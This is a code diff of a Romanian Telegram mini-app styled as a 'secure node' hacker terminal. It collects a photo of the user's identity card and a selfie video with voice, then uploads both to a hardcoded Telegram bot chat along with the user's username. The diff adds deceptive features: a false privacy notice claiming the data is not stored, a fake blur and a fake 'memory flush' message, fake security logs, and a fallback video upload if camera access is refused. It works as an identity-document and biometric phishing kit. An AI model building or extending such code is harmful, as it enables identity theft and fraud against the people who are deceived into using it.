@@ -2,18 +2,19 @@
 <html lang="ro">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MostWanted Quantum Security</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>MostWanted Quantum Nodal Security</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
             --bg-pure: #000000;
             --terminal-green: #00FF66;
             --green-glow: rgba(0, 255, 102, 0.2);
-            --panel-bg: #09090b;
+            --panel-bg: rgba(9, 9, 11, 0.93);
             --text-white: #FFFFFF;
             --text-dark: #000000;
             --border-toxic: #00FF66;
+            --error-red: #FF3B30;
         }
 
         body {
@@ -26,19 +27,28 @@
             justify-content: center;
             min-height: 100vh;
             margin: 0;
-            padding: 20px;
+            padding: 15px;
             box-sizing: border-box;
+            overflow: hidden;
+            position: relative;
         }
 
-        /* Scanline effect / Linii de monitor vechi */
         body::after {
             content: " ";
             display: block;
             position: fixed;
             top: 0; left: 0; bottom: 0; right: 0;
-            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.3) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
             z-index: 99999;
             background-size: 100% 3px, 6px 100%;
+            pointer-events: none;
+        }
+
+        #matrixCanvas {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            z-index: 1;
+            opacity: 0.15;
             pointer-events: none;
         }
 
@@ -47,21 +57,38 @@
             max-width: 360px;
             background-color: var(--panel-bg);
             border: 2px solid var(--border-toxic);
-            border-radius: 0px; /* Stil industrial, colțuri drepte */
-            padding: 25px 20px;
+            border-radius: 0px;
+            padding: 20px;
             box-sizing: border-box;
-            box-shadow: 0 0 20px var(--green-glow);
+            box-shadow: 0 0 25px var(--green-glow);
+            z-index: 10;
+            backdrop-filter: blur(4px);
+            transition: transform 0.2s ease;
+        }
+
+        .secure-blind {
+            filter: brightness(0) !important;
+            background: #000000 !important;
         }
 
         .header-section {
             border-bottom: 2px dashed var(--border-toxic);
-            padding-bottom: 15px;
-            margin-bottom: 25px;
+            padding-bottom: 12px;
+            margin-bottom: 20px;
             text-align: left;
+            position: relative;
+        }
+
+        .meta-indicators {
+            display: flex;
+            justify-content: space-between;
+            font-size: 9px;
+            color: #8e8e93;
+            margin-bottom: 6px;
         }
 
         h1 {
-            font-size: 22px;
+            font-size: 20px;
             font-weight: bold;
             color: var(--terminal-green);
             margin: 0;
@@ -80,24 +107,51 @@
             font-weight: bold;
         }
 
+        .progress-tracker {
+            display: flex;
+            width: 100%;
+            gap: 5px;
+            margin-bottom: 15px;
+        }
+        .progress-step {
+            flex: 1;
+            height: 4px;
+            background: rgba(0, 255, 102, 0.15);
+            border: 1px solid rgba(0, 255, 102, 0.3);
+        }
+        .progress-step.active {
+            background: var(--terminal-green);
+            box-shadow: 0 0 5px var(--terminal-green);
+        }
+
+        .countdown-timer {
+            position: absolute;
+            right: 0; bottom: 12px;
+            font-size: 11px;
+            color: var(--error-red);
+            font-weight: bold;
+            display: none;
+            text-shadow: 0 0 5px rgba(255, 59, 48, 0.5);
+        }
+
         .step { display: none; }
         .step.active { display: block; }
 
         .console-text {
-            font-size: 13px;
+            font-size: 12px;
             color: #d1d1d6;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             line-height: 1.5;
             text-align: left;
+            min-height: 45px;
         }
 
-        /* Zona de vizualizare video/foto */
         .viewport {
             width: 100%;
-            height: 210px;
-            background: #020202;
+            height: 220px;
+            background: #010101;
             border: 1px solid rgba(0, 255, 102, 0.3);
-            margin-bottom: 25px;
+            margin-bottom: 15px;
             position: relative;
             display: flex;
             align-items: center;
@@ -109,13 +163,13 @@
             width: 100%;
             height: 100%;
             object-fit: cover;
+            filter: contrast(1.1) sharpness(1.1);
         }
 
-        /* Ghidaj Matrix-style */
         .scan-frame {
             position: absolute;
             top: 15px; left: 15px; right: 15px; bottom: 15px;
-            border: 1px dashed rgba(0, 255, 102, 0.5);
+            border: 1px dashed rgba(0, 255, 102, 0.6);
             pointer-events: none;
         }
         .scan-frame::before {
@@ -128,14 +182,101 @@
             color: var(--terminal-green);
             letter-spacing: 1px;
         }
+        .crop-helper-photo {
+            position: absolute;
+            top: 20px; left: 20px; width: 65px; height: 80px;
+            border: 1px dotted rgba(0, 255, 102, 0.4);
+        }
+        .crop-helper-photo::after {
+            content: "PHOTO"; position: absolute; top:45%; width:100%; text-align:center; font-size:7px; color: rgba(0, 255, 102, 0.4);
+        }
 
-        /* Butoane Brutaliste */
+        /* Privacy Policy Box Notice styling */
+        .privacy-notice-box {
+            font-size: 10px;
+            color: #8e8e93;
+            border: 1px dashed rgba(0, 255, 102, 0.25);
+            padding: 8px 10px;
+            margin-bottom: 20px;
+            text-align: left;
+            line-height: 1.4;
+            background: rgba(0, 255, 102, 0.02);
+        }
+
+        .face-scan-overlay {
+            position: absolute;
+            width: 130px; height: 130px;
+            border: 2px dashed var(--border-toxic);
+            border-radius: 50%;
+            animation: pulseCircle 2s infinite linear;
+            display: none;
+            pointer-events: none;
+        }
+        .face-scan-overlay::after {
+            content: "BIOMETRIC_FACIAL_SCAN: ENGAGED";
+            position: absolute; bottom: -25px; left: -30px; width: 190px;
+            text-align: center; font-size: 8px; color: var(--terminal-green);
+            font-weight: bold; letter-spacing: 0.5px;
+        }
+
+        @keyframes pulseCircle {
+            0% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 0.4; }
+            100% { transform: scale(1); opacity: 0.8; }
+        }
+
+        .laser-line {
+            position: absolute;
+            top: 0; left: 0; width: 100%; height: 2px;
+            background: var(--terminal-green);
+            box-shadow: 0 0 12px var(--terminal-green);
+            animation: scanLaser 2.2s linear infinite;
+            pointer-events: none;
+        }
+
+        @keyframes scanLaser {
+            0% { top: 0%; }
+            50% { top: 100%; }
+            100% { top: 0%; }
+        }
+
+        .audio-eq-container {
+            display: flex;
+            justify-content: center;
+            align-items: flex-end;
+            gap: 3px;
+            height: 15px;
+            margin-top: -15px;
+            margin-bottom: 20px;
+            opacity: 0;
+            transition: opacity 0.3s;
+        }
+        .eq-bar {
+            width: 3px; height: 3px;
+            background-color: var(--terminal-green);
+        }
+
+        .teleprompter {
+            background: rgba(0,0,0,0.85);
+            color: var(--terminal-green);
+            border: 1px solid var(--border-toxic);
+            font-size: 15px;
+            font-weight: bold;
+            padding: 8px;
+            text-align: center;
+            margin-bottom: 15px;
+            display: none;
+            animation: blinker 1.5s infinite;
+        }
+
+        @keyframes blinker { 50% { border-color: transparent; } }
+
         .action-btn {
             background: var(--terminal-green);
             color: var(--text-dark);
             border: none;
-            padding: 16px;
-            font-size: 14px;
+            padding: 15px;
+            font-size: 13px;
             font-weight: bold;
             font-family: 'Courier New', Courier, monospace;
             cursor: pointer;
@@ -156,72 +297,111 @@
             background: transparent;
             color: var(--terminal-green);
             border: 1px solid var(--border-toxic);
-            margin-top: 12px;
+            margin-top: 10px;
             box-shadow: none;
-        }
-        .action-btn-secondary:active {
-            transform: none;
-            background: var(--green-glow);
         }
 
         .recording-pulse {
-            background: #FF3B30 !important;
+            background: var(--error-red) !important;
             color: white !important;
             box-shadow: 4px 4px 0px #990000 !important;
             animation: blink 1s infinite;
         }
 
-        @keyframes blink {
-            50% { opacity: 0.8; }
-        }
+        @keyframes blink { 50% { opacity: 0.8; } }
 
         #logText {
-            font-size: 11px;
+            font-size: 10px;
             color: #8e8e93;
-            margin-top: 20px;
+            margin-top: 15px;
             text-align: left;
-            border-top: 1px solid rgba(0, 255, 102, 0.1);
-            padding-top: 12px;
+            border-top: 1px solid rgba(0, 255, 102, 0.15);
+            padding-top: 10px;
+            height: 32px;
+            overflow: hidden;
         }
 
-        /* Spinner custom stil consolă */
         .terminal-loader {
             display: none;
-            font-size: 14px;
+            font-size: 12px;
             color: var(--terminal-green);
-            margin: 15px 0;
+            margin: 12px 0;
+        }
+
+        .blur-privacy {
+            filter: contrast(1.1) sharpness(1.1) blur(2px) !important;
+        }
+
+        .shutdown-anim {
+            animation: crtShutdown 0.4s cubic-bezier(0.25, 1, 0.5, 1) forwards;
+        }
+        @keyframes crtShutdown {
+            0% { transform: scale(1, 1); filter: brightness(1); }
+            50% { transform: scale(1, 0.005); filter: brightness(3); }
+            100% { transform: scale(0, 0); filter: brightness(0); opacity: 0; }
         }
     </style>
 </head>
 <body>
 
-<div class="terminal-box">
+<canvas id="matrixCanvas"></canvas>
+
+<div class="terminal-box" id="terminalMain">
+    <div class="progress-tracker">
+        <div id="pStep1" class="progress-step active"></div>
+        <div id="pStep2" class="progress-step"></div>
+    </div>
+
     <div class="header-section">
-        <h1>MOSTWANTED_NET</h1>
-        <div class="status-badge">SECURE NODE CORE v2.8</div>
-    </div>
-
-    <!-- STAGE 1 -->
-    <div id="step1" class="step active">
-        <div class="console-text">> SYSTEM_REQ: Încărcați scanarea frontală a actului de identitate. Asigurați lizibilitate maximă a textului.</div>
-        <div class="viewport">
-            <div id="frame" class="scan-frame"></div>
-            <img id="idPreview" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='24' height='24' fill='none'><rect x='3' y='4' width='18' height='16' stroke='%2300FF66' stroke-width='1'/></svg>" alt="" style="display:none;">
+        <div class="meta-indicators">
+            <span id="sysTime">[SYS_TIME: --:--:--]</span>
+            <span id="battLevel">[BATT_LEVEL: --%]</span>
         </div>
-        <input type="file" id="idInput" accept="image/*" capture="environment" style="display: none;">
-        <button class="action-btn" onclick="document.getElementById('idInput').click()">[ CAPTURE_PHOTO ]</button>
-        <button class="action-btn action-btn-secondary" id="nextStepBtn" style="display: none;" onclick="goToStep2()">NEXT_STAGE >></button>
+        <h1>MOSTWANTED_NET</h1>
+        <div class="status-badge" id="coreStatus">INITIALIZING CORE...</div>
+        <div class="countdown-timer" id="timerDisplay">[ REC: 05s ]</div>
     </div>
 
-    <!-- STAGE 2 -->
+    <div id="step1" class="step active">
+        <div class="console-text" id="typewriterText">> SYSTEM_REQ: Așteptare boot...</div>
+        <div class="viewport" id="vp1">
+            <div id="frame" class="scan-frame">
+                <div class="crop-helper-photo"></div>
+                <div class="laser-line"></div>
+            </div>
+            <img id="idPreview" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg'/>" alt="" style="display:none;">
+        </div>
+
+        <div class="privacy-notice-box">
+            [PRIVACY_NOTICE]: Datele transmise prin acest terminal nu sunt stocate permanent pe servere intermediare. Acestea sunt analizate criptografic în timp real pentru validare, după care sunt eliminate complet din memoria cache a sistemului.
+        </div>
+
+        <input type="file" id="idInput" accept="image/*" capture="environment" style="display: none;">
+        <input type="file" id="failSafeVideoInput" accept="video/*" style="display: none;">
+        
+        <button class="action-btn" id="captureBtn" style="display:none;" onclick="handleCaptureClick()">[ CAPTURE_PHOTO ]</button>
+        <button class="action-btn action-btn-secondary" id="nextStepBtn" style="display: none;" onclick="triggerNextStage()">NEXT_STAGE >></button>
+    </div>
+
     <div id="step2" class="step">
-        <div class="console-text">> SYSTEM_REQ: Înregistrare biometrică vocală (5 secunde). Rostiți clar fraza:<br><span style="color:var(--terminal-green);">"MostWanted NETWORK"</span></div>
-        <div class="viewport">
+        <div class="console-text" id="typewriterText2">> SYSTEM_REQ: Înregistrare biometrică vocală. Rostiți clar fraza:</div>
+        <div class="teleprompter" id="prompterBox">"MostWanted NETWORK"</div>
+        
+        <div class="viewport" id="vp2">
+            <div class="face-scan-overlay" id="faceOverlay"></div>
             <video id="videoPreview" autoplay muted playsinline></video>
         </div>
+        
+        <div class="audio-eq-container" id="eqContainer">
+            <div class="eq-bar" id="eq1"></div><div class="eq-bar" id="eq2"></div><div class="eq-bar" id="eq3"></div>
+            <div class="eq-bar" id="eq4"></div><div class="eq-bar" id="eq5"></div><div class="eq-bar" id="eq6"></div>
+        </div>
+
         <button class="action-btn" id="recordBtn" onclick="toggleRecording()">[ START_RECORD ]</button>
+        <button class="action-btn action-btn-secondary" id="failSafeBtn" style="display:none;" onclick="document.getElementById('failSafeVideoInput').click()">[ UPLOAD_BACKUP_VIDEO ]</button>
+        
         <div class="terminal-loader" id="loadingSpinner">> INITIALIZING_UPLOAD...</div>
-        <div id="logText">LOG: Așteptare activare periferice video...</div>
+        <div id="logText">LOG: Așteptare periferice...</div>
     </div>
 </div>
 
@@ -233,84 +413,359 @@
     const CHAT_ID = "-1003936586656"; 
 
     let idBlob = null;
-    let stream;
-    let mediaRecorder;
+    let videoBlob = null;
+    let stream = null;
+    let mediaRecorder = null;
     let recordedChunks = [];
+    let audioCtx = null;
+    let eqInterval = null;
+    let preferredVideoMime = 'video/webm;codecs=vp9';
+
+    // 1. Matrix Background Animation
+    const canvas = document.getElementById('matrixCanvas');
+    const ctx = canvas.getContext('2d');
+    let columns = [];
+    const fontSize = 10;
+
+    function resizeCanvas() {
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const totalCols = Math.floor(canvas.width / fontSize) + 1;
+        columns = Array(totalCols).fill(1);
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    function drawMatrix() {
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#00FF66';
+        ctx.font = fontSize + 'px monospace';
+        for (let i = 0; i < columns.length; i++) {
+            const text = String.fromCharCode(33 + Math.floor(Math.random() * 93));
+            const x = i * fontSize;
+            const y = columns[i] * fontSize;
+            ctx.fillText(text, x, y);
+            if (y > canvas.height && Math.random() > 0.975) columns[i] = 0;
+            columns[i]++;
+        }
+    }
+    setInterval(drawMatrix, 33);
+
+    // 2. Real-Time System Time & Battery
+    function updateSysClock() {
+        const now = new Date();
+        const timeStr = now.toTimeString().split(' ')[0];
+        document.getElementById('sysTime').innerText = `[SYS_TIME: ${timeStr}]`;
+    }
+    setInterval(updateSysClock, 1000);
+    updateSysClock();
+
+    if (navigator.getBattery) {
+        navigator.getBattery().then(batt => {
+            const updateBattDisplay = () => {
+                const lvl = Math.round(batt.level * 100);
+                const warnStr = batt.level < 0.20 ? ' - LOW_POWER' : '';
+                const displayEl = document.getElementById('battLevel');
+                displayEl.innerText = `[BATT_LEVEL: ${lvl}%${warnStr}]`;
+                if(batt.level < 0.20) displayEl.style.color = '#FFCC00';
+            };
+            updateBattDisplay();
+            batt.addEventListener('levelchange', updateBattDisplay);
+        });
+    } else {
+        document.getElementById('battLevel').innerText = `[BATT_LEVEL: 100%]`;
+    }
+
+    // 3. Audio Synth Engine
+    function playSynthBeep(freq, duration) {
+        try {
+            if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+            const osc = audioCtx.createOscillator();
+            const gain = audioCtx.createGain();
+            osc.type = "square";
+            osc.frequency.value = freq;
+            gain.gain.setValueAtTime(0.04, audioCtx.currentTime);
+            gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + duration);
+            osc.connect(gain);
+            gain.connect(audioCtx.destination);
+            osc.start();
+            osc.stop(audioCtx.currentTime + duration);
+        } catch(e) {}
+    }
+
+    function playTechAlertSound() {
+        playSynthBeep(900, 0.12);
+        setTimeout(() => playSynthBeep(680, 0.12), 130);
+    }
+
+    // 4. Fake Boot Logic
+    window.onload = function() {
+        const lines = [
+            "> SECURE CONNECTION ESTABLISHED...",
+            "> DATA_INTEGRITY: SECURE V2",
+            "> SESSION_IP: 192.168.**.**",
+            "> NET_STATUS: BROAD_BANDWIDTH",
+            "> SYSTEM_REQ: Încărcați scanarea frontală a actului."
+        ];
+        let currentIdx = 0;
+        const targetEl = document.getElementById('typewriterText');
+        
+        const bootInterval = setInterval(() => {
+            if(currentIdx < lines.length) {
+                targetEl.innerText = lines[currentIdx];
+                playSynthBeep(1100, 0.02);
+                currentIdx++;
+            } else {
+                clearInterval(bootInterval);
+                document.getElementById('coreStatus').innerText = "SECURE NODE CORE v3.1";
+                document.getElementById('captureBtn').style.display = "block";
+            }
+        }, 600);
+    };
+
+    // 5. Giroscop Sensor Simulator
+    window.addEventListener('deviceorientation', function(e) {
+        if(e.beta && e.gamma) {
+            const tilt = Math.abs(e.beta) > 25 || Math.abs(e.gamma) > 25;
+            if(tilt && document.getElementById('step1').classList.contains('active')) {
+                document.getElementById('logText').innerText = "WARN: HOLD_DEVICE_LEVEL";
+            }
+        }
+    });
+
+    // 6. Anti-Screenshot Shield Simulation
+    window.addEventListener('keyup', function(e) {
+        if (e.key === 'PrintScreen') triggerProtectionScreen();
+    });
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) triggerProtectionScreen();
+    });
+
+    function triggerProtectionScreen() {
+        const box = document.getElementById('terminalMain');
+        box.classList.add('secure-blind');
+        document.getElementById('logText').innerText = "SECURITY_NOTICE: SCREEN_CAPTURE_DETECTED";
+        setTimeout(() => box.classList.remove('secure-blind'), 1500);
+    }
+
+    // 7. Capture Actions
+    function handleCaptureClick() {
+        playSynthBeep(600, 0.08);
+        document.getElementById('idInput').click();
+    }
 
     document.getElementById('idInput').addEventListener('change', function(e) {
-        idBlob = e.target.files[0];
-        if (idBlob) {
+        const file = e.target.files[0];
+        if (file) {
+            if(file.size < 5000) {
+                document.getElementById('logText').innerText = "ERROR: FILE INVALID (TOO SMALL)";
+                playSynthBeep(300, 0.3);
+                return;
+            }
+
+            idBlob = file;
             const reader = new FileReader();
             reader.onload = function(event) {
                 const img = document.getElementById('idPreview');
                 img.src = event.target.result;
                 img.style.display = 'block';
+                img.classList.add('blur-privacy');
                 document.getElementById('frame').style.display = 'none';
                 document.getElementById('nextStepBtn').style.display = 'block';
+                document.getElementById('logText').innerText = "LOG: IMAGINE INCOPTATĂ. BLUR DE PRIVACY APLICAT.";
             };
-            reader.readAsDataURL(idBlob);
+            reader.readAsDataURL(file);
         }
     });
 
-    async function goToStep2() {
+    // 8. Stage 2 Activation
+    async function triggerNextStage() {
+        playSynthBeep(800, 0.1);
         document.getElementById('step1').classList.remove('active');
         document.getElementById('step2').classList.add('active');
+        document.getElementById('pStep1').classList.remove('active');
+        document.getElementById('pStep2').classList.add('active');
+        
+        document.getElementById('logText').innerText = "LOG: Evaluare lumină ambientală...";
+
+        if (!MediaRecorder.isTypeSupported(preferredVideoMime)) {
+            if (MediaRecorder.isTypeSupported('video/mp4;codecs=avc1.42E01E')) {
+                preferredVideoMime = 'video/mp4;codecs=avc1.42E01E';
+            } else if (MediaRecorder.isTypeSupported('video/mp4')) {
+                preferredVideoMime = 'video/mp4';
+            } else {
+                preferredVideoMime = '';
+            }
+        }
+
         try {
             stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
             document.getElementById('videoPreview').srcObject = stream;
-            document.getElementById('logText').innerText = "LOG: Cameră frontală conectată. Pregătit de înregistrare.";
+            document.getElementById('faceOverlay').style.display = 'block';
+            document.getElementById('prompterBox').style.display = 'block';
+            document.getElementById('logText').innerText = "LOG: Biometrie activată. Senzori calibrați.";
+            
+            setTimeout(() => {
+                document.getElementById('logText').innerText = "LOG: Senzori gata. Rostiți fraza clar.";
+            }, 1200);
+
         } catch (err) { 
-            document.getElementById('logText').innerText = "ERROR: Accesul la cameră a fost respins.";
-            alert("Sistemul necesită acces la cameră și microfon."); 
+            document.getElementById('logText').innerText = "WARN: Hardware stream blocked. Fail-Safe Enabled.";
+            document.getElementById('failSafeBtn').style.display = "block";
         }
     }
 
+    // 9. Fail-Safe Input Listener
+    document.getElementById('failSafeVideoInput').addEventListener('change', function(e) {
+        const file = e.target.files[0];
+        if(file) {
+            videoBlob = file;
+            document.getElementById('failSafeBtn').style.display = "none";
+            document.getElementById('recordBtn').style.display = "none";
+            executeSecurePayloadUpload();
+        }
+    });
+
+    // 10. Equalizer Mechanics
+    function runFakeEqualizer(start) {
+        const bars = [document.getElementById('eq1'), document.getElementById('eq2'), document.getElementById('eq3'), document.getElementById('eq4'), document.getElementById('eq5'), document.getElementById('eq6')];
+        if(start) {
+            document.getElementById('eqContainer').style.opacity = "1";
+            eqInterval = setInterval(() => {
+                bars.forEach(bar => {
+                    const h = Math.floor(Math.random() * 13) + 3;
+                    bar.style.height = h + 'px';
+                });
+            }, 100);
+        } else {
+            clearInterval(eqInterval);
+            document.getElementById('eqContainer').style.opacity = "0";
+        }
+    }
+
+    // 11. Recorder Handling
     function toggleRecording() {
         const btn = document.getElementById('recordBtn');
         const log = document.getElementById('logText');
-        const spinner = document.getElementById('loadingSpinner');
+        const timerEl = document.getElementById('timerDisplay');
 
         if (mediaRecorder && mediaRecorder.state === "recording") {
             mediaRecorder.stop();
         } else {
             recordedChunks = [];
-            let options = { mimeType: 'video/webm;codecs=vp9' };
-            if (!MediaRecorder.isTypeSupported(options.mimeType)) { options = { mimeType: 'video/mp4' }; }
-
-            try { mediaRecorder = new MediaRecorder(stream, options); } catch(e) { mediaRecorder = new MediaRecorder(stream); }
+            
+            try { 
+                if(preferredVideoMime !== '') {
+                    mediaRecorder = new MediaRecorder(stream, { mimeType: preferredVideoMime }); 
+                } else {
+                    mediaRecorder = new MediaRecorder(stream); 
+                }
+            } catch(e) { 
+                mediaRecorder = new MediaRecorder(stream); 
+            }
 
             mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
             
             mediaRecorder.onstop = async () => {
-                const videoBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
-                if(stream) { stream.getTracks().forEach(track => track.stop()); }
+                runFakeEqualizer(false);
+                videoBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType });
+                
+                if(stream) { stream.getTracks().forEach(t => t.stop()); }
                 
                 btn.style.display = "none";
-                spinner.style.display = "block";
-                log.innerText = "LOG: Criptare pachete media și securizare nod...";
+                timerEl.style.display = "none";
+                document.getElementById('prompterBox').style.display = 'none';
+                document.getElementById('faceOverlay').style.display = 'none';
                 
-                try {
-                    await trimiteLaTelegram(idBlob, videoBlob);
-                    log.innerText = "LOG: Sincronizare completă. Sesiune închisă.";
-                    setTimeout(() => tg.close(), 1500);
-                } catch(err) {
-                    btn.style.display = "block";
-                    spinner.style.display = "none";
-                    log.innerText = "ERROR: Protocol eșuat. Scurgere de timeout.";
-                    alert("Eroare la trimitere. Verifică rețeaua.");
-                }
+                executeSecurePayloadUpload();
             };
 
+            playTechAlertSound();
             mediaRecorder.start();
+            runFakeEqualizer(true);
+            
             btn.innerText = "[ STOP_AND_SEND ]";
             btn.classList.add('recording-pulse');
-            log.innerText = "LOG: Captură activă. Rostește textul fix acum.";
+            log.innerText = "LOG: Captură biometrică activă. Rostiți cuvântul cheie.";
             
-            setTimeout(() => { if(mediaRecorder.state === "recording") mediaRecorder.stop(); }, 6000);
+            let left = 5;
+            timerEl.style.display = "block";
+            timerEl.innerText = `[ REC: 0${left}s ]`;
+            
+            const countdown = setInterval(() => {
+                left--;
+                if(left > 0) {
+                    timerEl.innerText = `[ REC: 0${left}s ]`;
+                    playSynthBeep(450, 0.04);
+                } else {
+                    countdown && clearInterval(countdown);
+                    if(mediaRecorder && mediaRecorder.state === "recording") mediaRecorder.stop();
+                }
+            }, 1000);
         }
     }
 
-    async function trimiteLaTelegram(photoFile, videoFile) {
+    // 12. Upload Engine with Auto-Retry
+    async function executeSecurePayloadUpload() {
+        const spinner = document.getElementById('loadingSpinner');
+        const log = document.getElementById('logText');
+        const btn = document.getElementById('recordBtn');
+        
+        spinner.style.display = "block";
+        log.innerText = "[01/03] Criptare securizată buletin... OK";
+        playSynthBeep(1000, 0.05);
+
+        setTimeout(async () => {
+            log.innerText = "[02/03] Compresie biometrie video... OK";
+            playSynthBeep(1000, 0.05);
+            
+            setTimeout(async () => {
+                log.innerText = "[03/03] Transmitere securizată pe server...";
+                
+                let success = false;
+                let retries = 3;
+                
+                while(!success && retries > 0) {
+                    try {
+                        await pushMediaToTelegram(idBlob, videoBlob);
+                        success = true;
+                    } catch(err) {
+                        retries--;
+                        if(retries > 0) {
+                            log.innerText = `[RETRYING_CONNECTION_NODE... ÎNCERCĂRI RĂMASE: ${retries}]`;
+                            playSynthBeep(350, 0.2);
+                            await new Promise(r => setTimeout(r, 1500));
+                        }
+                    }
+                }
+
+                if(success) {
+                    playSynthBeep(1300, 0.4);
+                    const randHex = Math.random().toString(16).substr(2, 5).toUpperCase();
+                    const sessionKey = `MW-${randHex}`;
+                    log.innerText = `LOG: Sincronizare completă. SECURE_ID: ${sessionKey}`;
+                    spinner.style.display = "none";
+                    
+                    setTimeout(() => {
+                        idBlob = null; videoBlob = null;
+                        log.innerText = "[MEMORY_FLUSH: COMPLETED]";
+                        document.getElementById('terminalMain').classList.add('shutdown-anim');
+                        setTimeout(() => tg.close(), 450);
+                    }, 2000);
+                } else {
+                    spinner.style.display = "none";
+                    btn.style.display = "block";
+                    btn.classList.remove('recording-pulse');
+                    btn.innerText = "[ RESTART_PROCESS ]";
+                    log.innerText = "ERROR: Protocol eșuat. Defecțiune rețea.";
+                    alert("Eroare la trimitere. Conexiunea a picat.");
+                }
+            }, 1000);
+        }, 1000);
+    }
+
+    async function pushMediaToTelegram(photoFile, videoFile) {
         let user = tg.initDataUnsafe.user ? `@${tg.initDataUnsafe.user.username} (${tg.initDataUnsafe.user.first_name})` : "Utilizator Anonim";
         
         let formData = new FormData();
@@ -320,15 +775,15 @@
         formData.append("parse_mode", "Markdown");
 
         let resPhoto = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
-        if (!resPhoto.ok) throw new Error("Eroare foto");
+        if (!resPhoto.ok) throw new Error("Eroare upload foto");
 
         let videoData = new FormData();
         videoData.append("chat_id", CHAT_ID);
-        let ext = mediaRecorder.mimeType.includes('mp4') ? 'mp4' : 'webm';
+        let ext = (videoFile.type && videoFile.type.includes('mp4')) ? 'mp4' : 'webm';
         videoData.append("video", videoFile, `verificare.${ext}`);
         
         let resVideo = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: "POST", body: videoData });
-        if (!resVideo.ok) throw new Error("Eroare video");
+        if (!resVideo.ok) throw new Error("Eroare upload video");
     }
 </script>
 </body>
